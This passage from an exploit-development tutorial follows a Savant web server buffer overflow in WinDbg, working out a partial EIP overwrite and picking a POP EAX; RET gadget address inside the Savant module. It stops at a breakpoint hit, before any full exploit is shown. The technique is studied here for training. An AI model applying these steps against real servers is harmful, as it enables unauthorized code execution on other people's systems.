</span></span><span style="display:flex;"><span><span style="color:#ae81ff">679</span>b0000 <span style="color:#ae81ff">67</span>a45000 TextShaping          <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>TextShaping.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69</span>d80000 <span style="color:#ae81ff">69</span>d8e000 winrnr               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>winrnr.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69</span>d90000 <span style="color:#ae81ff">69</span>da0000 wshbth               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>wshbth.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>a230000 <span style="color:#ae81ff">6</span>a246000 pnrpnsp              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>pnrpnsp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>a980000 <span style="color:#ae81ff">6</span>a991000 napinsp              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>napinsp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>bfd0000 <span style="color:#ae81ff">6</span>c05d000 COMCTL32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>WinSxS<span style="color:#960050;background-color:#1e0010">\</span>x86_microsoft.windows.common<span style="color:#f92672">-</span>controls_6595b64144ccf1df_5<span style="color:#ae81ff">.82.19041.4355</span>_none_c0dc01d438beab35<span style="color:#960050;background-color:#1e0010">\</span>COMCTL32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>c980000 <span style="color:#ae81ff">6</span>c988000 WSOCK32              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>WSOCK32.dll
</span></span></code></pre></div><p>The Savant module (main application) does not have any protection. <strong>However, it is mapped at an address that contains a null byte at the start.</strong> Having a null byte in the address space of the module is an issue, as the application will treat our buffer as a string when inserting the instruction in EIP. A null byte is a string terminator. We need a different approach.</p>
<p>Choosing an address of the other modules, which are Microsoft modules, would mean that the exploit is <strong>dependent on whatever version on Windows is installed on our target (as these DLLs probably will change)</strong>. In addition, we also have to deal with another mitigations like ASLR.</p>
<p>To overcome this issue, we will abuse something that we have already discovered: Our buffer is treated as a string and therefore a null byte is added at the end of it. Remember it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea1c  <span style="color:#ae81ff">00434343</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x34343</span>
</span></span></code></pre></div><p>This provides us with an interesting opportunity to use a technique known as a <strong>partial EIP overwrite</strong>.
Because the module we want to attack is mapped in an address range that begins with a null byte, we could use the null byte that the application inserts on our buffer as part of our overwrite.</p>
<p>Indeed, if we send as payload only three bytes to overwrite EIP, we still get the same null byte applied:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea1c  <span style="color:#ae81ff">00434343</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x34343</span>
</span></span></code></pre></div><p>So we could insert any address inside the Savant module using the null byte that is added in that position. But now we need to decide what instruction we want to redirect the execution flow to. The bad thing is that ESP does not point to our buffer nor any register.</p>
<p>During our initial crash analysis, we noticed that the second DWORD on the stack at the time of the crash points very close to our current stack pointer.
In fact, it always seems to point to the HTTP method, followed by the rest of the data we sent:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds esp L2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea1c  <span style="color:#ae81ff">00414141</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea20  <span style="color:#ae81ff">0505</span>ea74
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dc <span style="color:#ae81ff">0505</span>ea74
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea74  <span style="color:#ae81ff">00544547</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>  GET.............
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea84  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">4141412f</span> <span style="color:#ae81ff">41414141</span>  ........<span style="color:#f92672">/</span>AAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea94  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eaa4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eab4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eac4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ead4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eae4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>Our goal then is to find an assembly instruction sequence that redirects the execution flow to this data.
Thinking that this value is the second value in ESP, we could do a POP, RET instruction:
The first POP would remove the first DWORD from the stack.
This would make ESP point to the memory address that contains our buffer starting with the HTTP GET method. After executing the RET instruction, we should be placed right at the beginning of our HTTP method.
Using such an instruction sequence would mean that we will have to execute the assembly instructions generated by the GET method opcodes. Let&rsquo;s see this instructions:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#a6e22e">poi</span>(esp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea74  <span style="color:#ae81ff">00544547</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea78  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea7c  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea80  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea84  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea88  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea8c  <span style="color:#ae81ff">4141412f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea90  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea94  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea98  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> u <span style="color:#a6e22e">poi</span>(esp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea74 <span style="color:#ae81ff">47</span>              inc     edi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea75 <span style="color:#ae81ff">45</span>              inc     ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea76 <span style="color:#ae81ff">54</span>              push    esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea77 <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea79 <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea7b <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea7d <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span>bea7f <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span></code></pre></div><p>The first instructions do not seem to affect the execution flow or generate any access violations. They are INC operations, and a PUSH instruction that pushes ESP to the stack.  The &ldquo;00&rdquo; instructions use the ADD operation, using the memory address of where EAX points. <strong>These instructions could be problematic as they assume that EAX points to a valid memory address.</strong>
Remember that we want to perform the POP, RET operation?
Let&rsquo;s see if the value we want to POP (the top of the stack) is a valid memory address:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">0025</span><span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">01</span>a3ff60
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01</span>a40000
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">01</span>a3c000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">0025</span><span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000</span>ec0 . <span style="color:#ae81ff">00000</span>cc0
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">004</span>c7520
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">00253000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">10038</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c0000008
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a3ea1c  <span style="color:#ae81ff">01</span>a3fe00 <span style="color:#75715e">// We are popping this value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">01</span>a3ea20  <span style="color:#ae81ff">01</span>a3ea74 <span style="color:#75715e">// We want to return here, address of where our payload is stored
</span></span></span></code></pre></div><p>The value that we are popping is inside the StackBase and StackLimit addresses, which means that it is inside the stack! As it is a valid address, we will pop it into EAX so that the instructions that use EAX are valid!
We need to find a POP EAX, RET instructions inside the Savant module. Let&rsquo;s see which instructions are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msf<span style="color:#f92672">-</span>nasm_shell
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> pop eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">58</span>                pop eax                                                                             
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  C3                ret 
</span></span></code></pre></div><p>Let&rsquo;s search for these instructions in the module and pick any of them that does not contain badchars:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> lm m savant
</span></span><span style="display:flex;"><span>Browse full module list
</span></span><span style="display:flex;"><span>start    end        module name
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00452000</span>   Savant   <span style="color:#a6e22e">C</span> (no symbols)           
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00452000</span>   <span style="color:#ae81ff">58</span> c3
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span>  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec<span style="color:#f92672">-</span><span style="color:#ae81ff">51</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">7</span>d <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">00</span> ff <span style="color:#ae81ff">75</span>  X<span style="color:#ae81ff">.3</span>..U..QQ.}...u
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041924f</span>  <span style="color:#ae81ff">58</span> c3 a1 <span style="color:#ae81ff">68</span> a2 <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">56</span><span style="color:#f92672">-</span><span style="color:#ae81ff">83</span> f8 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">33</span>  X..h.D.V...WufS3
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">004194f</span><span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 a1 <span style="color:#ae81ff">68</span> a2<span style="color:#f92672">-</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">83</span> f8 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">06</span> a1  X<span style="color:#ae81ff">.3</span>...h.D....u..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">9613</span>  <span style="color:#ae81ff">58</span> c3 a1 <span style="color:#ae81ff">4</span>c a2 <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">8</span>d<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">80</span> a1 <span style="color:#ae81ff">50</span> a2 <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">8</span>d  X..L.D.....P.D..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>a531  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">3</span>d <span style="color:#ae81ff">68</span><span style="color:#f92672">-</span>ae <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">00</span> ff <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">57</span>  X<span style="color:#ae81ff">.3</span>...<span style="color:#f92672">=</span>h.C..SUVW
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>af7f  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> db <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>f6 <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">3</span>b f3 <span style="color:#ae81ff">74</span>  X..e<span style="color:#ae81ff">.3.3</span>..M..;.t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>b464  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec<span style="color:#f92672">-</span><span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">56</span>  X<span style="color:#ae81ff">.3</span>..U......E.SV
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>b9fa  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">0f</span> b6 <span style="color:#ae81ff">44</span><span style="color:#f92672">-</span><span style="color:#ae81ff">24</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">8</span>a <span style="color:#ae81ff">4</span>c <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">88</span>  X<span style="color:#ae81ff">.3</span>....D<span style="color:#960050;background-color:#1e0010">$</span>..L<span style="color:#960050;background-color:#1e0010">$</span>...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>ba2e  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec <span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">18</span><span style="color:#f92672">-</span><span style="color:#ae81ff">53</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">6</span>a <span style="color:#ae81ff">19</span> e8 b6 f3  X.U.....SVWj....
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>c49a  <span style="color:#ae81ff">58</span> c3 e8 c6 b9 ff ff <span style="color:#ae81ff">83</span><span style="color:#f92672">-</span>c0 <span style="color:#ae81ff">54</span> c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec <span style="color:#ae81ff">81</span> ec  X........T.U....
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>cc30  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">89</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>d dc <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">5</span>d  X..e<span style="color:#ae81ff">.3</span>..}..M...]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>cce4  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>db <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">75</span> d8  X..e<span style="color:#ae81ff">.3.3</span>..M...u.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span>eb74  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">33</span> c0 c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">8</span>b ec<span style="color:#f92672">-</span><span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">8</span>d <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">6</span>a <span style="color:#ae81ff">78</span>  X<span style="color:#ae81ff">.3</span>..U....x.E.jx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041f</span>e21  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">89</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>d d4 <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">75</span>  X..e<span style="color:#ae81ff">.3</span>..}..M...u
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041f</span>e7e  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>db <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">3</span>b df <span style="color:#ae81ff">74</span>  X..e<span style="color:#ae81ff">.3.3</span>..M..;.t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00420</span><span style="color:#ae81ff">904</span>  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>f6 <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">3</span>b f7 <span style="color:#ae81ff">74</span>  X..e<span style="color:#ae81ff">.3.3</span>..M..;.t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00420</span>a1d  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> f6 <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>ff <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">3</span>b fe <span style="color:#ae81ff">74</span>  X..e<span style="color:#ae81ff">.3.3</span>..M..;.t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00420e69</span>  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> db <span style="color:#ae81ff">89</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>d dc <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">75</span>  X..e<span style="color:#ae81ff">.3</span>..]..M...u
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00420</span>ed8  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> db <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>ff <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">75</span> e0  X..e<span style="color:#ae81ff">.3.3</span>..M...u.
</span></span></code></pre></div><p>The first one is a good candidate. Replacing such address with the EIP overwrite leads us in landing to such address. Let&rsquo;s analyze it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> bp <span style="color:#ae81ff">0x418674</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> Savant.exe
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0000000</span>e edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77732</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000202</span>
</span></span><span style="display:flex;"><span>Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18674</span><span style="color:#f92672">:</span>
